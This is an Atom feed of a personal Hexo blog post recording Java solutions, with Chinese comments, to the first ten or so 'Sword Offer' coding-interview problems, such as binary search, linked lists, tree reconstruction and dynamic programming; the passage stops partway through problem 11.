<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JKZhang</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://JKZhang.github.io/"/>
  <updated>2020-08-27T22:35:04.962Z</updated>
  <id>http://JKZhang.github.io/</id>
  
  <author>
    <name>JKZhang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《剑指offer》刷题记录</title>
    <link href="http://JKZhang.github.io/2020/08/%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://JKZhang.github.io/2020/08/《剑指offer》刷题记录/</id>
    <published>2020-08-27T22:36:00.000Z</published>
    <updated>2020-08-27T22:35:04.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="《剑指offer》刷题记录"><a href="#《剑指offer》刷题记录" class="headerlink" title="《剑指offer》刷题记录"></a>《剑指offer》刷题记录</h1><h3 id="1-二维数组的查找"><a href="#1-二维数组的查找" class="headerlink" title="1.二维数组的查找"></a>1.二维数组的查找</h3><h4 id="标签：【数组】【查找】"><a href="#标签：【数组】【查找】" class="headerlink" title="标签：【数组】【查找】"></a>标签：【数组】【查找】</h4><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p></blockquote><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> target, <span class="keyword">int</span> [][] array)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array==<span class="keyword">null</span> || array.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//二分查找</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> low=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> high=array[i].length-<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">                <span class="keyword">int</span> mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(array[i][mid]&lt;target)&#123;</span><br><span class="line">                    low=mid+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(array[i][mid]&gt;target)&#123;</span><br><span class="line">                    high=mid-<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="2-替换空格"><a href="#2-替换空格" class="headerlink" title="2.替换空格"></a>2.替换空格</h3><h4 id="标签：【字符串】"><a href="#标签：【字符串】" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。</p></blockquote><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">replaceSpace</span><span class="params">(StringBuffer str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(str==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            String result=<span class="string">""</span>;</span><br><span class="line">            <span class="comment">//注意split方法，传入"\\s"转义字符表示空格，-1为limit表示返回结果长度不做限制，否则不能返             //回分隔符是最后一个字符这种情况下分隔符后的""字符</span></span><br><span class="line">            String[] res=str.toString().split(<span class="string">"\\s"</span>,-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(String s :res)</span><br><span class="line">            &#123;</span><br><span class="line">                result=result+s+<span class="string">"%20"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//substring方法左闭右开</span></span><br><span class="line">            <span class="keyword">return</span> result.substring(<span class="number">0</span>,result.length()-<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="3-从尾到头打印链表"><a href="#3-从尾到头打印链表" class="headerlink" title="3.从尾到头打印链表"></a>3.从尾到头打印链表</h3><h4 id="标签：【链表】"><a href="#标签：【链表】" class="headerlink" title="标签：【链表】"></a>标签：【链表】</h4><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个链表，按链表从尾到头的顺序返回一个ArrayList。</p></blockquote><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*    public class ListNode &#123;</span></span><br><span class="line"><span class="comment">*        int val;</span></span><br><span class="line"><span class="comment">*        ListNode next = null;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*        ListNode(int val) &#123;</span></span><br><span class="line"><span class="comment">*            this.val = val;</span></span><br><span class="line"><span class="comment">*        &#125;</span></span><br><span class="line"><span class="comment">*    &#125;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">printListFromTailToHead</span><span class="params">(ListNode listNode)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(listNode==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode temp=listNode;</span><br><span class="line">        <span class="comment">//由题意，先进后出，即栈，利用ArrayList的add(position,value)方法，每次在0位置插入新值，然后         //从头输出即复合题意了</span></span><br><span class="line">        <span class="keyword">while</span>(temp!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            res.add(<span class="number">0</span>,temp.val);</span><br><span class="line">            temp=temp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="4-重建二叉树"><a href="#4-重建二叉树" class="headerlink" title="4.重建二叉树"></a>4.重建二叉树</h3><h4 id="标签：【树】"><a href="#标签：【树】" class="headerlink" title="标签：【树】"></a>标签：【树】</h4><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。</p></blockquote><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for binary tree</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> * int val;</span></span><br><span class="line"><span class="comment"> * TreeNode left;</span></span><br><span class="line"><span class="comment"> * TreeNode right;</span></span><br><span class="line"><span class="comment"> * TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">reConstructBinaryTree</span><span class="params">(<span class="keyword">int</span>[] pre, <span class="keyword">int</span>[] in)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//安全带：递归退出条件</span></span><br><span class="line">        <span class="keyword">if</span> (pre == <span class="keyword">null</span> || in == <span class="keyword">null</span> || pre.length == <span class="number">0</span> || in.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//必要的一些处理</span></span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(pre[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; in.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in[i] == pre[<span class="number">0</span>]) &#123;</span><br><span class="line">                index = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//开始递归</span></span><br><span class="line">        root.left = reConstructBinaryTree(Arrays.copyOfRange(pre, <span class="number">1</span>, index + <span class="number">1</span>), Arrays.copyOfRange(in, <span class="number">0</span>, index));</span><br><span class="line">        root.right = reConstructBinaryTree(Arrays.copyOfRange(pre, index + <span class="number">1</span>, pre.length), Arrays.copyOfRange(in, index + <span class="number">1</span>, in.length));</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="5-用两个栈实现队列"><a href="#5-用两个栈实现队列" class="headerlink" title="5.用两个栈实现队列"></a>5.用两个栈实现队列</h3><h4 id="标签：【队列】【栈】"><a href="#标签：【队列】【栈】" class="headerlink" title="标签：【队列】【栈】"></a>标签：【队列】【栈】</h4><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</p></blockquote><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Stack&lt;Integer&gt; stack1 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">    Stack&lt;Integer&gt; stack2 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        stack1.push(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stack2.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (stack1.size() != <span class="number">0</span>) &#123;</span><br><span class="line">                stack2.push(stack1.pop());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="6-旋转数组的最小数字"><a href="#6-旋转数组的最小数字" class="headerlink" title="6.旋转数组的最小数字"></a>6.旋转数组的最小数字</h3><h4 id="标签：【查找】"><a href="#标签：【查找】" class="headerlink" title="标签：【查找】"></a>标签：【查找】</h4><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。<br>输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。<br>例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。<br>NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。</p></blockquote><h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minNumberInRotateArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array == <span class="keyword">null</span> || array.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//二分查找</span></span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = array.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="comment">//非递减的数组提前返回</span></span><br><span class="line">            <span class="keyword">if</span> (array[low] &lt; array[high]) &#123;</span><br><span class="line">                <span class="keyword">return</span> array[low];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//情况1，arr[mid] &gt; target：4 5 6 1 2 3</span></span><br><span class="line"><span class="comment">//arr[mid] 为 6， target为右端点 3， arr[mid] &gt; target, 说明[first ... mid] 都是   //&gt;= target 的，因为原始数组是非递减，所以可以确定答案为 [mid+1...last]区间,所以 first             //= mid + 1</span></span><br><span class="line">            <span class="keyword">if</span> (array[mid] &gt; array[high]) &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//情况2，arr[mid] &lt; target:5 6 1 2 3 4</span></span><br><span class="line"><span class="comment">//arr[mid] 为 1， target为右端点 4， arr[mid] &lt; target, 说明答案肯定不在//[mid+1...last]，但是arr[mid] 有可能是答案,所以答案在[first, mid]区间，所以last = //mid;</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (array[mid] &lt; array[high]) &#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//情况3，arr[mid] == target:</span></span><br><span class="line">            <span class="comment">//如果是 1 0 1 1 1， arr[mid] = target = 1, 显然答案在左边</span></span><br><span class="line"><span class="comment">//如果是 1 1 1 0 1, arr[mid] = target = 1, 显然答案在右边</span></span><br><span class="line"><span class="comment">//所以这种情况，不能确定答案在左边还是右边，那么就让last = last - 1;慢慢缩少区间，同时也 //不会错过答案。</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                high--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[low];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="7-斐波那契数列"><a href="#7-斐波那契数列" class="headerlink" title="7.斐波那契数列"></a>7.斐波那契数列</h3><h4 id="标签：【递归】【动态规划】"><a href="#标签：【递归】【动态规划】" class="headerlink" title="标签：【递归】【动态规划】"></a>标签：【递归】【动态规划】</h4><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项（从0开始，第0项为0，第1项是1）。</p><p>n&lt;=39</p></blockquote><h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//直接使用递归复杂度超高，采用记表法记录最近两位的值</span></span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> one = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                sum = sum + one;</span><br><span class="line">                one = sum - one;</span><br><span class="line">                n--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="8-跳台阶"><a href="#8-跳台阶" class="headerlink" title="8.跳台阶"></a>8.跳台阶</h3><h4 id="标签：【递归】【动态规划】-1"><a href="#标签：【递归】【动态规划】-1" class="headerlink" title="标签：【递归】【动态规划】"></a>标签：【递归】【动态规划】</h4><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法（先后次序不同算不同的结果）。</p></blockquote><h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">JumpFloor</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span> || target == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> target;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//动态规划，优化掉递归栈空间。常规方法是从上往下递归然后再从下往上回溯的，最后回溯的时候来合并子树  //从而求得答案。那么动态规划不同的是，不用递归的过程，直接从子树求得答案。过程是从下往上。并且对空    //间复杂度也做了优化</span></span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= target; i++) &#123;</span><br><span class="line">            c = a + b;</span><br><span class="line">            a = b;</span><br><span class="line">            b = c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="9-变态跳台阶"><a href="#9-变态跳台阶" class="headerlink" title="9.变态跳台阶"></a>9.变态跳台阶</h3><h4 id="标签：【动态规划】"><a href="#标签：【动态规划】" class="headerlink" title="标签：【动态规划】"></a>标签：【动态规划】</h4><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p></blockquote><h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">JumpFloorII</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span> || target == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> target;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//可以采用递归，记忆化递归，动态规划，递推。这里采用递推的方式。</span></span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= target; i++) &#123;</span><br><span class="line">            b = a &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            a = b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="10-矩形覆盖"><a href="#10-矩形覆盖" class="headerlink" title="10.矩形覆盖"></a>10.矩形覆盖</h3><h4 id="标签：【递归】"><a href="#标签：【递归】" class="headerlink" title="标签：【递归】"></a>标签：【递归】</h4><h4 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>我们可以用2<em>1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2</em>1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？</p><p>比如n=3时，2*3的矩形块有3种覆盖方法：</p><p><img src="//JKZhang.github.io/2020/08/《剑指offer》刷题记录/6384065_1581999858239_64E40A35BE277D7E7C87D4DCF588BE84.png" alt="img"></p></blockquote><h4 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">RectCover</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span> || target == <span class="number">1</span> || target == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> target;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//动态规划</span></span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= target; i++) &#123;</span><br><span class="line">            c = a + b;</span><br><span class="line">            a = b;</span><br><span class="line">            b = c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="11-二进制中1的个数"><a href="#11-二进制中1的个数" class="headerlink" title="11.二进制中1的个数"></a>11.二进制中1的个数</h3><h4 id="标签：【数学】"><a href="#标签：【数学】" class="headerlink" 